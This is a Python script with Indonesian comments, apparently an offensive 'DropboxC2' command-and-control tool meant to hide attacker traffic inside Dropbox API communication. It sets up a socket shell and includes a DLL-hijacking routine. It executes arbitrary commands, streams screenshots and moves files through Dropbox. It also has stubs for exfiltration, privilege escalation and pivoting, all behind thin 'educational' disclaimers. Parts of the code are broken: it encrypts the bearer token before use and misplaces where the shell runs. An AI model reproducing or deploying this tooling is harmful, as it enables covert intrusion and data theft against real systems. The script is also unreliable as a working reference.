# Script ini mengintegrasikan fungsionalitas API Dropbox untuk memfasilitasi komunikasi antara sistem yang dikompromikan
# dan server yang dikendalikan oleh penyerang, dengan demikian lalu lintasnya mungkin disembunyikan dalam komunikasi 
# yang sah dari Dropbox.

# Catatan: Script ini hanya untuk tujuan simulasi dan penelitian, dan penggunaannya untuk tujuan ilegal adalah tanggung jawab pengguna.

# Install semua dependensi sebelum menjalankan script
# pip install -r requirements.txt
# python3 Dropboxc2.py

# Disclaimer: Script ini hanya untuk tujuan edukasi saja, dan penggunaan tidak sah dapat menyebabkan konsekuensi hukum.

import subprocess
import sys
import time
import threading
import socket
import base64
import os
import pyautogui
from pyvirtualdisplay import Display
import random
import shutil
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

BLUE = '\033[94m'
RESET = '\033[0m'


print(BLUE + """
██████╗ ██████╗  ██████╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗  ██████╗ ██████╗ 
██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝ ██╔════╝ ╚════██╗
██║  ██║██████╔╝██║   ██║██████╔╝██████╔╝██║   ██║ ╚███╔╝  ██║       █████╔╝
██║  ██║██╔══██╗██║   ██║██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗  ██║      ██╔═══╝ 
██████╔╝██║  ██║╚██████╔╝██║     ██████╔╝╚██████╔╝██╔╝ ██╗ ╚██████╗ ███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═════╝  ╚═════╝ ╚═╝  ╚═╝  ╚═════╝ ╚══════╝
""" + RESET)

# Meminta token akses Dropbox dari pengguna
access_token = input("Enter your Dropbox access token: ")
# Meminta alamat IP dan port untuk shell balik
ip = input("Enter the IP address for the reverse shell: ")
port = int(input("Enter the port number for the reverse shell: "))

# Fungsi untuk mengenkripsi token akses menggunakan enkripsi AES dengan mode ECB
def encrypt_access_token(token):
    # Meminta kunci AES dari pengguna
    key = input("Enter your AES key (must be 16, 24, or 32 bytes long): ").encode()
    if len(key) not in [16, 24, 32]:
        print("Invalid key length. AES key must be 16, 24, or 32 bytes long.")
        sys.exit(1)
    cipher = AES.new(key, AES.MODE_ECB)
    token_padded = pad(token.encode(), AES.block_size)
    return base64.b64encode(cipher.encrypt(token_padded)).decode()

# Mengenkripsi token akses
access_token_encrypted = encrypt_access_token(access_token)

# Header untuk permintaan API Dropbox
headers = {
    "Authorization": f"Bearer {access_token_encrypted}",
    "Content-Type": "application/json",
    "User-Agent": "Dropbox-API-Client/2.0",
    "Connection": "keep-alive",  # Menjaga koneksi tetap hidup
    "Accept-Encoding": "gzip, deflate, br",  # Menerima respon yang dikompresi
    "Accept-Language": "en-US,en;q=0.9",  # Preferensi bahasa
}

# Mendirikan koneksi shell balik
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, port))
s.listen(1)
print("Waiting for incoming connection...")
client_socket, addr = s.accept()

# Fungsi untuk melakukan DLL hijacking
def hijack_dll():
    # Meminta path DLL yang akan di-hijack
    dll_path = input("Enter the path of the DLL to hijack: ")

    # Meminta path DLL yang akan di-hijack
    target_exe = input("Enter the path of the target executable: ")
    
    # Menyalin DLL yang ditentukan ke direktori dari executable target
    shutil.copy(dll_path, os.path.dirname(target_exe))
    
    # Menjalankan executable target
    subprocess.run(target_exe, shell=True)

# Meminta pengguna apakah akan melakukan DLL hijacking
perform_hijack = input("Do you want to perform DLL hijacking? (yes/no): ").lower()

# Jika pengguna memilih untuk melakukan DLL hijacking, panggil fungsi hijack_dll
if perform_hijack == "yes":
    hijack_dll()
elif perform_hijack == "no":
    print("DLL hijacking will not be performed.")
else:
    print("Invalid input. DLL hijacking will not be performed.")

# Memulai proses shell
shell = subprocess.Popen(['/bin/bash', '-i'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

# Membuat virtual display pada server
display = Display(visible=0, size=(800, 600))
display.start()

# Manajemen sesi
sessions = {}
session_counter = 1

# Mengeksekusi perintah yang dimasukkan oleh pengguna
while True:
    command = input("Enter a command to execute (or type 'exit' to quit): ")
    if command.lower() == "exit":
        break
    
    # Randomisasi interval komunikasi
    time.sleep(random.uniform(1, 5))
    
    # Mengirim perintah ke proses shell dan mendapatkan outputnya
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    stdout = result.stdout
    stderr = result.stderr
    
    # Mengirim perintah dan output kembali ke klien
    client_socket.send(command.encode())
    client_socket.send(stdout.encode())
    client_socket.send(stderr.encode())

    # Jika perintah adalah 'screen', mulai menangkap display virtual
    if command.lower() == "screen":
        session_id = str(session_counter)
        session_counter += 1
        sessions[session_id] = {"socket": client_socket, "display": display}
        print(f"Started screen session {session_id}")

        # Menangkap display virtual dan mengonversi ke base64
        screen = pyautogui.screenshot()
        screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')

        # Mengirim data screen yang telah dienkode base64 ke klien
        client_socket.send(screen_data.encode())

        # Menangkap screen secara terus menerus dan mengirim pembaruan ke klien
        while True:
            try:
                # Menangkap display virtual
                screen = pyautogui.screenshot()
                screen_data = base64.b64encode(screen.tobytes()).decode('utf-8')

                # Mengirim data screen yang telah dienkode base64 ke klien
                client_socket.send(screen_data.encode())

                # Menunggu sejenak untuk mengatur kecepatan pembaruan layar
                time.sleep(0.1)
            except KeyboardInterrupt:
                # Jika pengguna menghentikan penangkapan layar, keluar dari loop
                print("\nScreen session ended.")
                break
    elif command.lower() == "exfiltrate":
        # Contoh: Mengekstrak data sensitif
        # Replace this with your own exfiltration method
        client_socket.send("Exfiltrating sensitive data...".encode())
        # Tambahkan kode ekstraksi di sini

    elif command.lower() == "escalate":
        # Example: Escalate privileges
        # Replace this with your own privilege escalation method
        client_socket.send("Escalating privileges...".encode())
        # Add your privilege escalation code here

    elif command.lower() == "pivot":
        # Example: Pivot to other systems in the network
        # Replace this with your own pivoting method
        client_socket.send("Pivoting to other systems...".encode())
        # Add your pivoting code here

    elif command.lower() == "upload":
        # Example: Upload a file to Dropbox
        file_path = input("Enter the path of the file to upload: ")
        file_name = os.path.basename(file_path)
        with open(file_path, "rb") as f:
            file_data = f.read()
        url = "https://content.dropboxapi.com/2/files/upload"
        headers["Dropbox-API-Arg"] = '{"path": "/'+ file_name +'","mode": "add","autorename": true,"mute": false,"strict_conflict": false}'
        response = requests.post(url, headers=headers, data=file_data)
        client_socket.send(response.text.encode())

    elif command.lower() == "download":
        # Example: Download a file from Dropbox
        file_path = input("Enter the path of the file to download: ")
        url = "https://content.dropboxapi.com/2/files/download"
        headers["Dropbox-API-Arg"] = '{"path": "'+ file_path +'"}'
        response = requests.post(url, headers=headers)
        with open(os.path.basename(file_path), "wb") as f:
            f.write(response.content)
        client_socket.send("File downloaded successfully.".encode())

    elif command.lower() == "get":
        # Example: Get file metadata from Dropbox
        file_path = input("Enter the path of the file: ")
        url = "https://api.dropboxapi.com/2/files/get_metadata"
        data = {"path": file_path}
        response = requests.post(url, headers=headers, json=data)
        client_socket.send(response.text.encode())

    elif command.lower() == "remove":
        # Example: Remove a file from Dropbox
        file_path = input("Enter the path of the file to remove: ")
        url = "https://api.dropboxapi.com/2/files/delete_v2"
        data = {"path": file_path}
        response = requests.post(url, headers=headers, json=data)
        client_socket.send(response.text.encode())

    elif command.lower() == "add":
        # Example: Create a folder on Dropbox
        folder_path = input("Enter the path of the folder to create: ")
        url = "https://api.dropboxapi.com/2/files/create_folder_v2"
        data = {"path": folder_path}
        response = requests.post(url, headers=headers, json=data)
        client_socket.send(response.text.encode())

    elif command.lower() == "list_folder":
        # Example: List files and folders in a directory on Dropbox
        folder_path = input("Enter the path of the folder to list: ")
        url = "https://api.dropboxapi.com/2/files/list_folder"
        data = {"path": folder_path}
        response = requests.post(url, headers=headers, json=data)
        client_socket.send(response.text.encode())

    else:
        # If the command is not 'screen', send the output back to the client
        client_socket.send(stdout.encode())
        client_socket.send(stderr.encode())

# Close the connection
client_socket.close()
s.close()
display.stop()
